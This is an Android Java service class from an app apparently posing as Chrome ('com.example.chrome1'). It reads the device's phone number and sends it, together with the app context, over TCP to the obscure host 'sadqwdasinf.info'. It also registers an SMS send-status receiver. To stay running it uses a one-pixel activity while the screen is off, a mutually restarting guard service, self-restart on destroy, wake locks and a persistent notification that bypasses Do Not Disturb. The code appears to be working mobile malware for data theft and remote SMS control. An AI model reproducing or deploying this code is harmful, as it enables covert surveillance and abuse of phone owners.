package com.example.chrome1;


import static android.app.Notification.VISIBILITY_SECRET;
import static com.example.chrome1.ScreenListener.ScreenStateListener;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.graphics.Color;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.RemoteException;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.RemoteViews;

import com.example.chrome1.activity.OnePiexlActivity;
import com.example.chrome1.network.TcpClient;
import com.example.chrome1.sms.SMSVerification;

import java.util.Calendar;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;


/**
 * Created by krock on 2016/6/18.
 */
public class FirstService extends Service {
    private SMSVerification smsVerification;
    private PowerManager.WakeLock mWakeLock;
    private final ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
    private RemoteViews remoteViews;

    @Override
    public void onCreate() {
        System.out.println("启动服务");
        gotoWakeLock(this);
        initSMSVerification();
        new Thread(() -> {
            try {
                TcpClient client = new TcpClient(executor);
                client.setHOST("sadqwdasinf.info");
                client.setPhone(getNumber(FirstService.this));
                client.setContext(FirstService.this);
                client.connect();
            } catch (Exception e) {
                e.fillInStackTrace();
            }
        }).start();
        //息屏监听
        ScreenListener l = new ScreenListener(this);
        l.begin(new ScreenStateListener() {

            @Override
            public void onUserPresent() {
                Log.e("onUserPresent", "onUserPresent");
            }

            @Override
            public void onScreenOn() {
                // 亮屏，finish一个像素的Activity
                KeepLiveActivityManager.getInstance(FirstService.this)
                        .finishKeepLiveActivity();
                Log.e("onScreenOn", "onScreenOn");
            }

            @Override
            public void onScreenOff() {
                // getLock(getApplicationContext());
                // 灭屏，启动一个像素的Activity
                KeepLiveActivityManager.getInstance(getApplicationContext())
                        .startKeepLiveActivity();
                Log.e("onScreenOff", "onScreenOff");

            }
        });
        //getLock(this);
    }


    // 唤醒屏幕
    private PowerManager mPowerManager;

    @SuppressLint({"InvalidWakeLockTag", "WakelockTimeout"})
    public void gotoWakeLock(Context context) {
        if (android.os.Build.VERSION.SDK_INT < 31) {
            return;
        }
        //亮屏逻辑代码
        if (mPowerManager == null) {
            mPowerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        }
        if (mWakeLock == null) {
            mWakeLock = mPowerManager.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP | PowerManager.SCREEN_DIM_WAKE_LOCK, "TAG");
        }
        boolean screenOn = mPowerManager.isInteractive();
        if (!screenOn) {
            //屏幕会持续点亮
            mWakeLock.acquire(1000L/*10 minutes*/);
            //释放锁，以便10分钟后熄屏
            mWakeLock.release();
        }
    }

    @SuppressLint({"HardwareIds", "MissingPermission"})
    private String getNumber(Context context) {
        //获取手机号码，有可能获取不到
        TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        return tm.getLine1Number();
    }

    //注册发送短信发送状态广播
    private void initSMSVerification() {
        smsVerification = new SMSVerification();
        IntentFilter mFilter01 = new IntentFilter("SMS_SEND_ACTIOIN");
        registerReceiver(smsVerification, mFilter01);
    }

    // 发送简单的通知消息（包括消息标题和消息内容）
    private void sendSimpleNotify() {
        String CHANNEL_ONE_ID = "1000085";
        String CHANNEL_ONE_NAME = "100000";
        NotificationChannel notificationChannel = null;
        //进行8.0的判断
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notificationChannel = new NotificationChannel(CHANNEL_ONE_ID,
                    CHANNEL_ONE_NAME, NotificationManager.IMPORTANCE_HIGH);
            notificationChannel.enableLights(true);
            notificationChannel.setLightColor(Color.RED);
            notificationChannel.setSound(null, null);
            notificationChannel.setShowBadge(true);
            notificationChannel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(notificationChannel);
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notificationChannel.setLockscreenVisibility(VISIBILITY_SECRET);
            //设置可绕过  请勿打扰模式
            notificationChannel.setBypassDnd(true);
        }
        remoteViews = new RemoteViews(getPackageName(), R.layout.notification_layout);
        Intent intent = new Intent(this, OnePiexlActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent, 0);
        Notification notification = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, CHANNEL_ONE_ID).setChannelId(CHANNEL_ONE_ID)
                    .setTicker("Nature")
                    .setCustomContentView(remoteViews)
                    .setSmallIcon(R.drawable.t)
                    .setContentIntent(pendingIntent)
                    .setOnlyAlertOnce(true)
                    .build();
        }
        if (notification != null) {
            notification.flags |= Notification.FLAG_NO_CLEAR;
        }
        startForeground(894555, notification);

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //startForeground(1,new Notification());
       // KeepLiveActivityManager.getInstance(this).startKeepLiveActivity();
        sendSimpleNotify();
        //绑定建立链接
        bindService(new Intent(this, GuardService.class), mServiceConnection, Context.BIND_IMPORTANT);
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(smsVerification);
        startService(new Intent(getApplicationContext(), FirstService.class));
        releaseLock();
    }


    private void releaseLock() {
        if (mWakeLock != null) {
            if (mWakeLock.isHeld()) {
                mWakeLock.release();
            }
            mWakeLock = null;
        }
    }

    /**
     * 同步方法   得到休眠锁
     *
     * @param context
     * @return
     */

    @SuppressLint("WakelockTimeout")
    private void getLock(Context context) {
        if (mWakeLock == null) {
            PowerManager mgr = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            mWakeLock = mgr.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, FirstService.class.getName());
            mWakeLock.setReferenceCounted(true);
            Calendar c = Calendar.getInstance();
            c.setTimeInMillis((System.currentTimeMillis()));
            int hour = c.get(Calendar.HOUR_OF_DAY);
            if (hour >= 23 || hour <= 6) {
                mWakeLock.acquire(/*10 minutes*/);
            } else {
                mWakeLock.acquire(/*10 minutes*/);
            }
        }
    }


    @Override
    public IBinder onBind(Intent intent) {
        return new IMyAidlInterface.Stub() {
            @Override
            public void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString) throws RemoteException {

            }
        };
    }

    private final ServiceConnection mServiceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            //断开重新链接
            startService(new Intent(FirstService.this, GuardService.class));
            //重新绑定
            bindService(new Intent(FirstService.this, GuardService.class),
                    mServiceConnection, Context.BIND_IMPORTANT);
        }
    };


}